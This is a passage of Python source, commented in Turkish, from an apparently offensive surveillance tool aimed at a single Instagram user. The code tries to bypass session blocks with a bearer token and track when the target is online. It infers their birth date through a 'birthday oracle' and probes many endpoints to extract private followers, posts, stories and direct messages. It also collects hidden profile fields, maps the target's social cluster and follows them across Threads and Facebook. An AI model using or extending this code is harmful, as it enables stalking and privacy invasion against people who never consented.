        client.disconnect()
    except Exception as e:                                         
        out['connect_error'] = f'{type(e).__name__}: {str(e)[:200]}'

    out['handshake'] = state
    out['frames_with_target_pk'] = received
    out['note'] = ('Modern IG MQTT thrift-compact CONNECT payload bekliyor; '
                    'paho native yapamadığı için handshake genelde rc=4/5 ile '
                    'reddedilir. Bu probe edge erişilebilirliğini ve target_pk '
                    'geçen herhangi bir frame\'i kayda alır.')
    return out


def run_phase26(target_username, target_pk, cookies, proxies=None,
                 mqtt_seconds=15):
    print(f'[*] Phase 26: PRESENCE INTEL pk={target_pk}')
    intel = {'pk': str(target_pk), 'ts_run': time.time()}

                                                                              
    print('  [0/5] Bearer token bypass (4415001 web-session block)...')
    bearer_info = _get_bearer_token(cookies, target_pk, proxies)
    intel['bearer_bypass'] = {
        'obtained': bool(bearer_info.get('bearer')),
        'www_claim_obtained': bool(bearer_info.get('www_claim')),
    }
    if bearer_info.get('bearer'):
        print('        ✓ Bearer token alındı — i.instagram.com 4415001 bypass aktif')
                                                                    
        thread_d = bearer_info.get('thread_data') or {}
        for u in (thread_d.get('users') or []):
            if str(u.get('pk')) == str(target_pk):
                dj = u.get('date_joined')
                if dj:
                    print(f'        [thread] date_joined={_ts_iso(dj, "s")} '
                          f'interop_fbid={u.get("interop_messaging_user_fbid")} '
                          f'priv={u.get("is_private")}')
        reach = thread_d.get('reachability_statuses') or {}
        if reach:
            print(f'        [thread] reachability={reach} '
                  f'unconnected={thread_d.get("is_viewer_unconnected")} '
                  f'safety_card={thread_d.get("should_show_safety_card")}')
        intel['bearer_bypass']['thread_context'] = {
            'reachability_statuses': reach,
            'is_viewer_unconnected': thread_d.get('is_viewer_unconnected'),
            'responsiveness_category': thread_d.get('responsiveness_category'),
            'should_show_safety_card': thread_d.get('should_show_safety_card'),
        }
    else:
        print(f'        [-] Bearer alınamadı: {bearer_info.get("error","?")}')

                                                         
    print('  [1/5] REST get_presence varyantları...')
    intel['rest_presence'] = probe_presence_rest(
        target_pk, cookies, bearer_info, proxies)
    for label, e in intel['rest_presence'].items():
        tp = e.get('target_presence') or {}
        tt = e.get('target_from_thread') or {}
        fr = e.get('friendship') or {}
        if tp and isinstance(tp, dict):
            print(f'        ✓ {label}: is_active={tp.get("is_active")} '
                  f'last={tp.get("last_activity_iso")} '
                  f'(Δ={tp.get("seconds_since_active")}s)')
        elif tt:
            print(f'        ✓ {label}: date_joined={tt.get("date_joined_iso")} '
                  f'priv={tt.get("is_private")} '
                  f'reach={e.get("reachability_statuses")} '
                  f'safety={e.get("should_show_safety_card")}')
        elif fr:
            print(f'        ✓ {label}: following={fr.get("following")} '
                  f'followed_by={fr.get("followed_by")} '
                  f'blocking={fr.get("blocking")} '
                  f'is_restricted={fr.get("is_restricted")}')
        elif e.get('gated_4415001'):
            print(f'        [GATED] {label}: 4415001 (i.ig web-session block)')
        else:
            print(f'        [{e.get("http_status")}] {label}')

                                    
    print('  [2/5] Inbox cross-check...')
    intel['inbox'] = probe_inbox_thread_for_target(target_pk, cookies, proxies)
    for label, e in intel['inbox'].items():
        if e.get('thread_id'):
            print(f'        ✓ {label}: thread={e["thread_id"]} '
                  f'last_item={e.get("last_permanent_item_iso")}')

                                
    print('  [3/5] Direct search USER object...')
    intel['search'] = probe_message_search_for_target(
        target_pk, target_username, cookies, proxies)
    if intel['search'].get('user_in_search'):
        print(f'        ✓ extra fields: '
              f'{list(intel["search"]["user_in_search"].keys())}')

                                                                  
    print('  [4/5] Non-UI hidden field dump (Bearer bypass)...')
    intel['non_ui_fields'] = probe_non_ui_fields(
        target_pk, cookies, bearer_info, proxies)
    nuf = intel['non_ui_fields']
    if nuf.get('http_status') == 200:
        print(f'        ✓ total_keys={nuf["total_keys"]}  '
              f'found_non_ui={len(nuf["found_fields"])}')
                                        
        bo = nuf.get('birthday_oracle') or {}
        bval = bo.get('value')
        print(f'        [BIRTHDAY ORACLE] birthday_today_visibility_for_viewer='
              f'{bval}')
        if bo.get('birthday_is_today'):
            print(f'        *** BUGÜN DOĞUM GÜNÜ! *** value={bval}')
        elif bo.get('has_birthday_data'):
            print(f'        [INFO] IG bu kullanıcı için DOB kaydediyor. '
                  f'365 sorgu/yıl ile tam DOB inference edilebilir.')
                          
        pd = nuf.get('pic_id_decode') or {}
        if pd.get('avatar_uploaded_iso'):
            print(f'        [AVATAR] upload={pd["avatar_uploaded_iso"]} '
                  f'({pd["avatar_age_days"]} gün önce) '
                  f'uploader_is_target={pd.get("uploader_is_target")}')
                                     
        for k in ('existing_user_age_collection_enabled',
                    'account_type', 'eimu_id', 'interop_messaging_user_fbid',
                    'fbid_v2', 'is_in_eu', 'is_in_canada',
                    'professional_conversion_suggested_account_type',
                    'has_private_collections', 'threads_profile_glyph_url'):
            v = nuf['found_fields'].get(k)
            if v is not None:
                v_str = str(v)[:80]
                print(f'        {k} = {v_str}')
    else:
        print(f'        [{nuf.get("http_status")}] {nuf.get("head","")}')

                                                    
    print('  [4.5/5] Story/highlight activity timing leak...')
    intel['story_timing'] = probe_story_activity_timing(
        target_pk, cookies, bearer_info, proxies)
                                                                         
                                                   
    sf_entry = intel['story_timing'].get('story_feed') or {}
    raw_payload = sf_entry.pop('_raw_payload', None)
    if raw_payload:
        path = _save_json(target_username, 'story_phase38.json', raw_payload)
        print(f'        -> phase38 raw saved: {path}')
    for label, e in intel['story_timing'].items():
        if e.get('present'):
            lrm = e.get('latest_reel_media_iso') or e.get('newest_item_iso')
            print(f'        ✓ {label}: latest_reel_media={lrm} '
                  f'expiring={e.get("expiring_at_iso")} '
                  f'count={e.get("item_count") or e.get("highlight_count")}')
        elif e.get('http_status') == 200:
                                                        
            if e.get('unviewable_authors_info') is not None:
                print(f'        [leak] {label}: unviewable_authors_info='
                      f'{e["unviewable_authors_info"]}')
            else:
                print(f'        [{e["http_status"]}] {label}: no story/reel data '
                      f'(private, no active story, or relationship gate)')
        else:
            print(f'        [{e.get("http_status")}] {label}')

                                                                              
    print('  [4.7/5] Extended Bearer probes...')
    intel['extended'] = probe_extended_bearer(
        target_pk, target_username, cookies, bearer_info, proxies)
    for label, e in intel['extended'].items():
        st = e.get('http_status')
        if st == 200:
                                       
            interesting = []
            if e.get('count_in_page'):
                interesting.append(f'count={e["count_in_page"]}')
            if e.get('count'):
                interesting.append(f'count={e["count"]}')
            if e.get('obfuscated_email'):
                interesting.append(f'email={e["obfuscated_email"]}')
            if e.get('obfuscated_phone'):
                interesting.append(f'phone={e["obfuscated_phone"]}')
            if e.get('extra_fields'):
                interesting.append(f'extra={list(e["extra_fields"].keys())}')
            if e.get('ruling'):
                interesting.append(f'ruling={e["ruling"]}')
            if e.get('note_count'):
                interesting.append(f'notes={e["note_count"]}')
            if e.get('item_count'):
                interesting.append(f'tagged_posts={e["item_count"]}')
            elif e.get('total_count') is not None and label == 'usertags_feed':
                interesting.append(
                    f'tagged_total={e["total_count"]} '
                    f'(items_returned=0)')
            if e.get('target_search_fields'):
                interesting.append(
                    f'search_extra={list(e["target_search_fields"].keys())}')
            if interesting:
                print(f'        ✓ {label}: {" ".join(interesting)}')
                                          
                if label == 'usertags_feed' and e.get('tagged_posts'):
                    for tp in e['tagged_posts'][:5]:
                        print(f'          tag: {tp["taken_at"]} '
                              f'by={tp["tagger_username"]} '
                              f'loc={tp["location"]}')
            else:
                print(f'        [200] {label}: keys={e.get("raw_keys")}')
        elif st == 429:
            print(f'        [429] {label}: rate-limited')
        elif st == 400:
            print(f'        [400] {label}: {e.get("head","")[:100]}')
        elif st == 404:
            print(f'        [404] {label}')
        elif st:
            print(f'        [{st}] {label}')
        else:
            print(f'        [err] {label}: {e.get("error")}')

                                                                   
    chaining = intel['extended'].get('suggested_users', {}).get('users') or []
    if chaining:
        cluster_path = _save_json(
            target_username, 'chaining_cluster.json',
            {'pk': str(target_pk), 'ts_run': time.time(),
             'viewer_pk': str(cookies.get('ds_user_id') or ''),
             'friendship_scope': 'authenticated_viewer_to_candidate',
             'count': len(chaining), 'users': chaining})
        print(f'        [CLUSTER] {len(chaining)} chaining accounts → {cluster_path}')
                                  
        for u in chaining[:10]:
            priv = 'prv' if u.get('is_private') else 'pub'
            score = u.get('chaining_score', '')
            print(f'          {u["username"]} pk={u["pk"]} [{priv}] '
                  f'score={score}')

                                                                   
    print('  [4.9/5] Private content bypass (follower/post/story/dm)...')
    intel['private_bypass'] = probe_private_content_bypass(
        target_pk, target_username, cookies, bearer_info, proxies)
    pb = intel['private_bypass']
                       
    for lbl in ('f_search_a', 'f_search_empty', 'f_mutual_fetch',
                 'f_following', 'f_top_followed_by', 'f_bloks_followers',
                 'f_graphql', 'f_friendships_show_many'):
        e = pb.get(lbl, {})
        st = e.get('http_status')
        cnt = e.get('count', 0)
        if cnt and cnt > 0:
            print(f'        *** FOLLOWER LEAK [{lbl}] count={cnt} ***')
            for u in (e.get('users') or [])[:10]:
                print(f'          {u.get("username")} pk={u.get("pk")} '
                      f'priv={u.get("is_private")}')
        elif e.get('gql_total_count'):
            print(f'        [graphql] {lbl}: total={e["gql_total_count"]} '
                  f'(items gated)')
        elif st:
            print(f'        [{st}] {lbl}')
                     
    for lbl in ('c_graphql_timeline', 'c_feed_user_clips', 'c_feed_reels',
                 'c_usertags_ranked', 'c_graphql_v2',
                 'c_clips_all', 'c_media_insight'):
        e = pb.get(lbl, {})
        st = e.get('http_status')
        ic = e.get('item_count') or e.get('gql_item_count') or 0
        if ic > 0:
            print(f'        *** CONTENT BYPASS [{lbl}] items={ic} ***')
            for it in (e.get('media_items') or e.get('gql_media') or [])[:5]:
                print(f'          media_id={it.get("media_id") or it.get("shortcode")} '
                      f'taken_at={it.get("taken_at")} '
                      f'type={it.get("media_type") or it.get("type")} '
                      f'likes={it.get("like_count")}')
        elif e.get('gql_count') is not None:
            print(f'        [graphql] {lbl}: post_count={e["gql_count"]} '
                  f'(content gated by privacy)')
        elif st:
            print(f'        [{st}] {lbl}')
                     
    for lbl in ('s_reels_media_profile', 's_reels_media_cold', 's_highlight_tray_v2',
                 's_story_feed_cf', 's_highlights_by_user', 's_story_seen_state',
                 's_graphql_story', 's_live_broadcast'):
        e = pb.get(lbl, {})
        st = e.get('http_status')
        si = e.get('story_items') or []
        hi = e.get('highlights') or []
        if si:
            print(f'        *** STORY ACCESS [{lbl}] items={len(si)} ***')
            for s in si[:5]:
                print(f'          story: {s.get("taken_at")} '
                      f'expires={s.get("expiring_at")} '
                      f'url={s.get("image_url","")[:60]}')
        elif hi:
            print(f'        *** HIGHLIGHTS [{lbl}] count={len(hi)} ***')
            for h_ in hi[:5]:
                print(f'          highlight: id={h_.get("id")} '
                      f'title={h_.get("title")} '
                      f'latest={h_.get("latest_reel_media")} '
                      f'cover={h_.get("cover_url","")[:60]}')
        elif st:
            print(f'        [{st}] {lbl}')
                
    for lbl in ('d_thread_legacy_sorted', 'd_thread_legacy_rev',
                 'd_thread_i_sorted', 'd_pending_inbox', 'd_spam_inbox',
                 'd_thread_by_participants_group', 'd_message_request_hide_state',
                 'd_inbox_full_cursor'):
        e = pb.get(lbl, {})
        st = e.get('http_status')
        if e.get('messages'):
            print(f'        *** DM ACCESS [{lbl}] msgs={e["message_count"]} ***')
            for m in e['messages'][:5]:
                print(f'          [{m.get("timestamp")}] uid={m.get("user_id")} '
                      f'{m.get("item_type")}: {m.get("text","")[:80]}')
        elif e.get('target_threads'):
            print(f'        *** THREAD FOUND [{lbl}] ***')
            for t in e['target_threads']:
                print(f'          thread_id={t.get("thread_id")} '
                      f'msgs={t.get("item_count")}')
        elif e.get('pending_thread_count', 0) > 0:
            print(f'        [pending] {lbl}: {e["pending_thread_count"]} requests')
        elif e.get('thread_id'):
            print(f'        ✓ {lbl}: thread={e.get("thread_id")} '
                  f'msgs={e.get("message_count")}')
        elif st:
            print(f'        [{st}] {lbl}')
          
    _save_json(target_username, 'private_bypass.json', pb)

                                                                  
    cluster_json = os.path.join(
        ARTIFACT_ROOT, target_username, 'chaining_cluster.json')
    print('  [4.99/5] Cluster tag/mention scan (public accounts only)...')
    intel['tag_search'] = probe_tag_search_in_cluster(
        target_pk, target_username, cookies,
        cluster_json, bearer_info, proxies,
        max_accounts=80, max_media=12)
    ts_r = intel['tag_search']
    print(f'        scanned={ts_r["accounts_scanned"]} '
          f'(cluster={ts_r["cluster_size"]}) '
          f'tagged_found={len(ts_r["tagged_posts_found"])}')
    for tp in ts_r['tagged_posts_found']:
        print(f'        *** TAG FOUND: @{tp["poster_username"]} ({tp["poster_pk"]}) ***')
        print(f'          post_url={tp.get("post_url")}')
        print(f'          taken_at={tp["taken_at"]}  loc={tp.get("location")}')
        print(f'          likes={tp.get("like_count")}  '
              f'comments={tp.get("comment_count")}')
        print(f'          caption: {tp.get("caption","")[:120]}')
        if tp.get('image_url'):
            print(f'          image_url={tp["image_url"][:100]}')
                            
    for gq in (ts_r.get('graphql_doc_id_attempts') or []):
        cnt = gq.get('items_returned', 0)
        total = gq.get('total_count')
        if cnt > 0:
            print(f'        *** GQL FOLLOWER [{gq["label"]}] '
                  f'items={cnt} total={total} ***')
            for u in gq.get('users', [])[:10]:
                print(f'          {u.get("username")} pk={u.get("pk")} '
                      f'priv={u.get("is_private")}')
        else:
            print(f'        [gql] {gq["label"]}: total={total} items_returned={cnt}')
    _save_json(target_username, 'tag_search_cluster.json', ts_r)

                                                                                
    print('  [4.999/5] Cross-platform bypass (Threads/Collab/Web/FB)...')
    intel['cross_platform'] = probe_cross_platform_bypass(
        target_pk, target_username, cookies, bearer_info, proxies)
    cp = intel['cross_platform']
    cp['target_pk'] = str(target_pk)
                     
    th_info = cp.get('th_user_info', {})
    if th_info.get('threads_user'):
        tu = th_info['threads_user']
        print(f'        *** THREADS PROFILE FOUND ***')
        print(f'          username={tu.get("username")} '
              f'priv={tu.get("is_private")} '
              f'followers={tu.get("follower_count")} '
              f'posts={tu.get("media_count")}')
    for lbl in ('th_followers', 'th_following'):
        e = cp.get(lbl, {})
        cnt = e.get('count', 0)
        if cnt:
            print(f'        *** THREADS {lbl.upper()} count={cnt} ***')
            for u in (e.get('users') or [])[:10]:
                print(f'          {u.get("username")} pk={u.get("pk")} '
                      f'priv={u.get("is_private")}')
        elif e.get('http_status'):
            print(f'        [{e["http_status"]}] {lbl}')
    for lbl in ('th_user_threads', 'th_user_replies'):
        e = cp.get(lbl, {})
        cnt = e.get('item_count', 0)
        if cnt:
            print(f'        *** THREADS POSTS [{lbl}] count={cnt} ***')
            for p in (e.get('posts') or [])[:5]:
                print(f'          {p.get("taken_at")} likes={p.get("like_count")} '
                      f'{str(p.get("text",""))[:80]}')
        elif e.get('http_status'):
            print(f'        [{e["http_status"]}] {lbl}')
                           
    col = cp.get('collab_coauthored', {})
    if col.get('collab_count', 0) > 0:
        print(f'        *** COLLAB POSTS found={col["collab_count"]} ***')
        for p in col.get('collab_posts', []):
            print(f'          url={p.get("post_url")} coauthors={p.get("coauthors")}')
    tag_feed = cp.get('tagged_media_by_tag_name', {})
    if tag_feed.get('tag_feed_count', 0) > 0:
        print(f'        *** HASHTAG #{target_username} posts={tag_feed["tag_feed_count"]} ***')
        for p in (tag_feed.get('tag_posts') or [])[:5]:
            print(f'          @{p.get("poster_username")} | {p.get("taken_at")} '
                  f'url={p.get("post_url")}')
            print(f'          caption: {p.get("caption","")[:100]}')
    elif tag_feed.get('http_status'):
        print(f'        [{tag_feed["http_status"]}] tagged_media_by_tag_name')
                 
    wp = cp.get('web_profile_full', {})
    if wp.get('media_count') is not None or wp.get('edge_media_count') is not None:
        print(f'        [web_profile] media_count={wp.get("media_count")} '
              f'edge_count={wp.get("edge_media_count")} '
              f'followers={wp.get("follower_count")} '
              f'following={wp.get("following_count")}')
        if wp.get('media_items_leaked'):
            print(f'        *** MEDIA LEAKED via web_profile: '
                  f'{wp["media_items_leaked"]} items ***')
    fb_scope = cp.get('facebook_cross_platform') or {}
    if fb_scope.get('attempted') is False:
        print(f'        [facebook] skipped: {fb_scope.get("reason")}')
    _save_json(target_username, 'cross_platform_bypass.json', cp)

                       
    print(f'  [5/5] MQTT WSS handshake ({mqtt_seconds}s)...')
    if mqtt_seconds <= 0:
        intel['mqtt'] = {'attempted': False, 'skipped': 'web fast mode'}
    else:
        intel['mqtt'] = probe_mqtt_presence(target_pk, cookies, mqtt_seconds)
    if intel['mqtt'].get('attempted'):
        h_s = intel['mqtt']['handshake']
        print(f'        rc={h_s.get("rc")} connected={h_s.get("connected")} '
              f'frames={len(intel["mqtt"]["frames_with_target_pk"])}')
    else:
        print(f'        skipped: {intel["mqtt"].get("skipped")}')

    path = _save_json(target_username, 'presence_intel.json', intel)
    print(f'  → {path}')
    return intel


                                                                               
                                                                   
                                                                               
                         
                                                                    
                                                            
                                                                               
                                                                     
                                                                          
                                                                

DSA_ENDPOINTS = [
    ('/api/v1/users/{pk}/about/?surface=profile_about_v2',
     'about_v2'),
    ('/api/v1/users/{pk}/about/?surface=profile_about',
     'about_v1'),
    ('/api/v1/users/{pk}/about/',
     'about_default'),
                              
    ('/api/v1/users/{pk}/dsa_transparency/',
     'dsa_transparency'),
    ('/api/v1/users/{pk}/account_information/?surface=transparency',
     'account_information'),
    ('/api/v1/users/{pk}/about_account/',
     'about_account'),
                                                   
    ('/api/v1/users/web_profile_info/?username={username}'
     '&include_about=true&include_transparency=true',
     'web_about_inflated'),
                                                                               
    ('/api/v1/bloks/apps/com.instagram.user_management.profile_info_dsa.'
     'about_account/?params=%7B%22user_id%22%3A%22{pk}%22%7D',
     'bloks_dsa_about'),
    ('/api/v1/bloks/apps/com.instagram.user_management.profile_info_dsa.'
     'former_usernames/?params=%7B%22user_id%22%3A%22{pk}%22%7D',
     'bloks_former_usernames'),
    ('/api/v1/bloks/apps/com.instagram.user_management.profile_info_dsa.'
     'shared_followers/?params=%7B%22user_id%22%3A%22{pk}%22%7D',
     'bloks_shared_followers'),
]

DSA_FIELD_KEYS = (
    'former_usernames', 'previous_usernames', 'usernames_history',
    'username_history',
    'account_creation_year_month', 'account_creation_country',
    'account_country_code', 'verified_country_code',
    'date_joined_as_creator', 'shared_followers_count',
    'profile_country', 'is_government_official_account',
    'is_state_controlled_media', 'verified_business_account_country',
    'account_takeover_count', 'last_password_change_year_month',
    'shop_country', 'business_address_json', 'public_email',
    'public_phone_country_code', 'connected_facebook_page_country',
    'is_run_from_country', 'profile_country_code',
    'connected_facebook_page_id', 'connected_instagram_account_id',
    'transparency_label', 'is_op_consented_to_show_in_explore',
    'mutual_followers_count', 'business_contact_method',
)

                                                               
                                                   
DSA_TEXT_PATTERNS = [
    ('joined_year_month',
     r'(?:Joined Instagram in|Hesap Instagram\'a katıldı|Created in)\s+'
     r'([A-ZÇĞİŞÜÖa-zçğışüö]+\s+\d{4})'),
    ('based_in_country',
     r'(?:Based in|Located in|Account based in|Ülke|Country)[\s:]+'
     r'([A-Z][A-Za-zÇĞİŞÜÖçğışüöÀ-ſ\s]{2,30}?)(?:[,\.\n"]|$)'),
    ('country_code_2letter',
     r'"country_code"\s*:\s*"([A-Z]{2})"'),
    ('former_username_at',
     r'(?:changed username from|Eski kullanıcı adı|Previously)[:\s]+@?'
     r'([a-zA-Z0-9._]{3,30})'),
    ('account_active_since',
     r'(?:active since|aktif olduğu tarih|since)\s+'
     r'([A-ZÇĞİŞÜÖa-zçğışüö]+\s+\d{4})'),
    ('shared_followers_text',
     r'(\d+)\s+(?:shared followers|ortak takipçi|mutual followers)'),
    ('verified_label_text',
     r'(?:Verified by|Doğrulayan)[:\s]+'
     r'(government|state media|business|creator|public figure)'),
]


def _walk_dsa_fields(obj, depth=0):
    found = {}
    if depth > 10:
        return found
    if isinstance(obj, dict):
        for k, v in obj.items():
            if k in DSA_FIELD_KEYS:
                if v not in (None, '', [], {}, 0, False):
                    found[k] = v
            sub = _walk_dsa_fields(v, depth + 1)
            for sk, sv in sub.items():
                if sk not in found:
                    found[sk] = sv
                elif isinstance(sv, list) and isinstance(found[sk], list):
                    seen = {json.dumps(x, sort_keys=True, default=str)
                             for x in found[sk]}
                    for it in sv:
                        if json.dumps(it, sort_keys=True, default=str) not in seen:
                            found[sk].append(it)
    elif isinstance(obj, list):
        for it in obj:
            sub = _walk_dsa_fields(it, depth + 1)
            for sk, sv in sub.items():
                if sk not in found:
                    found[sk] = sv
    return found


def parse_dsa_response(text, label):
    out = {}
    try:
        d = json.loads(text)
        out['_field_walk'] = _walk_dsa_fields(d)
    except (json.JSONDecodeError, ValueError):
        d = None

                                                                
    text_extracts = {}
    for pat_name, pat in DSA_TEXT_PATTERNS:
        for m in re.finditer(pat, text):
            text_extracts.setdefault(pat_name, []).append(m.group(1).strip())
                 
    text_extracts = {k: list(dict.fromkeys(v)) for k, v in text_extracts.items()}
    if text_extracts:
        out['_text_extracts'] = text_extracts

    return out if (out.get('_field_walk') or out.get('_text_extracts')) else None


def run_phase27(target_username, target_pk, cookies, proxies=None):
    print(f'[*] Phase 27: DSA TRANSPARENCY pk={target_pk}')
    intel = {'pk': str(target_pk), 'ts_run': time.time(), 'endpoints': {}}
    headers = _headers(cookies)

    for path_template, label in DSA_ENDPOINTS:
        path = (path_template
                .replace('{pk}', str(target_pk))
                .replace('{username}', target_username))
        url = 'https://i.instagram.com' + path
        try:
            r = requests.get(url, headers=headers, cookies=cookies,
                              timeout=20, proxies=proxies)
        except requests.exceptions.RequestException as e:
            intel['endpoints'][label] = {'error': type(e).__name__}
            continue
        entry = {'http_status': r.status_code, 'size': len(r.text)}
        if r.status_code == 200 and len(r.text) > 50:
            parsed = parse_dsa_response(r.text, label)
            if parsed:
                entry['parsed'] = parsed
                _save_raw(target_username, f'dsa_{label}.raw.json', r.text)
        intel['endpoints'][label] = entry
        marker = ('✓' if entry.get('parsed') else
                   ('200' if r.status_code == 200 else str(r.status_code)))
        keys = list((entry.get('parsed') or {}).get('_field_walk', {}).keys())
        text_keys = list((entry.get('parsed') or {})
                          .get('_text_extracts', {}).keys())
        print(f'  [{marker}] {label}: {len(r.text)}B '
              f'fields={keys} text={text_keys}')
        time.sleep(0.4)

                                                                           
    aggregate = {}
    for label, entry in intel['endpoints'].items():
        p = entry.get('parsed') or {}
        for k, v in (p.get('_field_walk') or {}).items():
            aggregate.setdefault('fields', {}).setdefault(k, []).append(
                {'source': label, 'value': v})
        for k, vals in (p.get('_text_extracts') or {}).items():
            aggregate.setdefault('text', {}).setdefault(k, [])
            for v in vals:
                if v not in [t['value'] for t in aggregate['text'][k]]:
                    aggregate['text'][k].append({'source': label, 'value': v})
    intel['aggregate'] = aggregate

                                                          
    definitive = {}
    fields = aggregate.get('fields') or {}
    text = aggregate.get('text') or {}
    if 'former_usernames' in fields:
        definitive['former_usernames'] = fields['former_usernames'][0]['value']
    elif 'former_username_at' in text:
        definitive['former_usernames'] = [
            t['value'] for t in text['former_username_at']]
    if 'account_creation_country' in fields:
        definitive['account_creation_country'] = (
            fields['account_creation_country'][0]['value'])
    elif 'based_in_country' in text:
        definitive['account_creation_country_text'] = (
            text['based_in_country'][0]['value'])
    elif 'country_code_2letter' in text:
        definitive['country_code_2letter'] = (
            text['country_code_2letter'][0]['value'])
    if 'account_creation_year_month' in fields:
        definitive['account_creation_year_month'] = (
            fields['account_creation_year_month'][0]['value'])
    elif 'joined_year_month' in text:
        definitive['joined_year_month_text'] = (
            text['joined_year_month'][0]['value'])
    if 'account_takeover_count' in fields:
        definitive['account_takeover_count'] = (
            fields['account_takeover_count'][0]['value'])
    if 'shared_followers_count' in fields:
        definitive['shared_followers_count'] = (
            fields['shared_followers_count'][0]['value'])
    elif 'shared_followers_text' in text:
        definitive['shared_followers_text'] = (
            text['shared_followers_text'][0]['value'])
    intel['definitive'] = definitive

    if definitive:
        print(f'\n  [+] DEFINITIVE NEW DATA:')
        for k, v in definitive.items():
            print(f'      {k} = {v}')
    else:
        print(f'\n  [-] DSA endpoint\'leri target için veri döndürmedi '
              f'(bu hesap muhtemelen non-EU veya DSA scope dışı)')

    path = _save_json(target_username, 'dsa_transparency.json', intel)
    print(f'  → {path}')
    return intel


                                                                               
                                               
                                                                               
                                                                            
                                                                         
                                                                         
                                                                             
                                                              
                                                       
                                                                                 
                                                                   
                                                   
                                                                                  
                                                          
                                                           
                                                              
                                                       
                                                                                    
                                                                            
                                                                       
 
                                                                            
                                                                        
                                                                       

INFO_MODULE_SWEEPS = (
                         
    'feed_timeline',                            
    'profile',                                         
    'story_viewer',                                   
    'dm_thread',                                                       
    'barcelona_profile',                                     
    'restrict_set',                                    
    'blocked_list',                                 
    'follow_request',                                 
    'ayml_profile_card',                           
    'profile_about',                                 
    'notification_center',                                  
    'explore_v2_profile_card',                               
    'feed_contextual_self_profile',                  
    'direct_thread_user_row',                         
    'search_typeahead',                                    
                                                                           
                                                                         
                                                                      
    'feed_explore_v2',                                                  
    'reels_viewer',                                         
    'live_lobby',                                          
    'saved_collection',                                   
    'shop_profile',                                  
    'tag_indirect_feed',                                  
    'audio_page',                                        
    'creator_marketplace',                                  
    'highlight_viewer',                                  
    'broadcast_chat',                             
    'feed_short_url',                                     
    'discover_people',                                       
)

                                                    
BLOKS_TARGET_APPS = [
    'com.instagram.user_management.profile_info_dsa.about_account',
    'com.instagram.user_management.profile_info_dsa.former_usernames',
    'com.instagram.profile.action_sheet',
    'com.instagram.profile.long_press_action_sheet',
    'com.instagram.profile.report.user_report_screen',
    'com.instagram.profile.report.report_options',
    'com.instagram.barcelona.profile.barcelona_profile_action_sheet',
    'com.instagram.dsa.report_v2',
    'com.instagram.privacy.restrict.restrict_action_sheet',
    'com.instagram.privacy.block.block_action_sheet',
    'com.instagram.direct.options_screen',
    'com.instagram.profile.subscription.subscription_options',
    'com.instagram.creator.creator_marketplace.profile_view',
    'com.instagram.feed.media_options.shared_post_options',
]


                                                                        
                                                                   
                                                                     
                       
_NOISE_KEYS_FOR_DIFF = {
    'profile_pic_url',                                                  
    'hd_profile_pic_url_info',                   
    'hd_profile_pic_versions',                                                   
    'threads_profile_glyph_url',                                  
    'external_lynx_url',                                  
}

                                                                             
                                                                
_LIST_ID_KEYS = ('pk', 'pk_id', 'id', 'strong_id__', 'username', 'link_id')


def _list_id_set(items):
    """List-of-dict üzerinde benzersiz id seti çıkar. Order/sıralama gürültüsünü
    elimine eder; gerçek üye değişikliği görünür hale gelir."""
    out = set()
    for it in items or []:
        if not isinstance(it, dict):
            continue
        for k in _LIST_ID_KEYS:
            v = it.get(k)
            if v is not None and v != '':
                out.add(str(v))
                break
    return out


def _list_pk_to_username(items):
    """chaining_results gibi alanlarda pk → username eşleşmesi çıkar."""
    out = {}
    for it in items or []:
        if not isinstance(it, dict):
            continue
        pk = it.get('pk') or it.get('pk_id') or it.get('id')
        if pk is None:
            continue
        un = it.get('username') or it.get('full_name')
        out[str(pk)] = un
    return out


def _diff_user_objects(baseline, module_user):
    """Derin diff: shallow `!=` yerine list/dict yapısını dolaşıp
    anlamlı sinyal çıkar.

    Returns dict with:
      new_keys, missing_keys     — top-level presence
      length_changes             — list/dict cardinality değişimi
      list_set_diffs             — list-of-dict alanlarda eklenen/kaldırılan id'ler
      dict_subkey_diffs          — dict alanlarda yeni/eksik alt key'ler
      scalar_changes             — skaler farklılıklar (NOISE filtrelendi)
    """
    out = {
        'new_keys': sorted(set(module_user) - set(baseline)),
        'missing_keys': sorted(set(baseline) - set(module_user)),
        'length_changes': {},
        'list_set_diffs': {},
        'dict_subkey_diffs': {},
        'scalar_changes': {},
    }
    for k in set(baseline) & set(module_user):
        if k in _NOISE_KEYS_FOR_DIFF:
            continue
        bv, mv = baseline[k], module_user[k]
        if isinstance(bv, list) and isinstance(mv, list):
            if len(bv) != len(mv):
                out['length_changes'][k] = {
                    'baseline_len': len(bv),
                    'module_len': len(mv),
                    'delta': len(mv) - len(bv),
                }
            if bv and isinstance(bv[0], dict):
                bset = _list_id_set(bv)
                mset = _list_id_set(mv)
                added = mset - bset
                removed = bset - mset
                if added or removed:
                    out['list_set_diffs'][k] = {
                        'added': sorted(added)[:30],
                        'removed': sorted(removed)[:30],
                        'added_count': len(added),
                        'removed_count': len(removed),
                    }
        elif isinstance(bv, dict) and isinstance(mv, dict):
            new_sub = sorted(set(mv) - set(bv))
            missing_sub = sorted(set(bv) - set(mv))
            if new_sub or missing_sub:
                out['dict_subkey_diffs'][k] = {
                    'new_sub_keys': new_sub[:15],
                    'missing_sub_keys': missing_sub[:15],
                }
        elif bv != mv and mv not in (None, '', [], {}):
            out['scalar_changes'][k] = {
                'baseline': str(bv)[:120],
                'module': str(mv)[:120],
            }
    return out


def run_from_module_sweep(target_pk, target_username, cookies, proxies=None):
    """Phase 28 v3: aynı /api/v1/users/{pk}/info/ endpoint'ini 15 farklı
    from_module değeriyle çağırıp DERIN diff yap. IG modülün ranking
    algoritmasını/gating policy'sini değiştiriyor; aynı top-level alanların
    İÇERIĞI farklı: chaining_results her modülde başka 20-25 hesap döner.
    Union ~80+ hesap (baseline'ın 4 katı).

    Returns:
        snapshots_meta:           her module için http_status + size
        baseline_size:            baseline response byte
        module_deltas:            her module için derin diff sonucu
                                    (list_set_diffs, length_changes, vb.)
        cluster_union:            tüm modüllerin chaining_results birleşimi
                                    (pk → {username, source_modules})
        bio_links_union:          tüm modüllerin bio_links birleşimi
        cluster_baseline_count:   baseline'da görünen hesap sayısı
        cluster_union_count:      union ile elde edilen toplam hesap sayısı
    """
    headers = _headers(cookies)
    snapshots = {}
    for module in INFO_MODULE_SWEEPS:
        url = (f'https://i.instagram.com/api/v1/users/{target_pk}/info/'
                f'?from_module={module}&include_chaining=true'
                f'&include_reel=true&include_highlight=true')
        try:
            r = requests.get(url, headers=headers, cookies=cookies,
                              timeout=20, proxies=proxies)
        except requests.exceptions.RequestException as e:
            snapshots[module] = {'error': type(e).__name__}
            continue
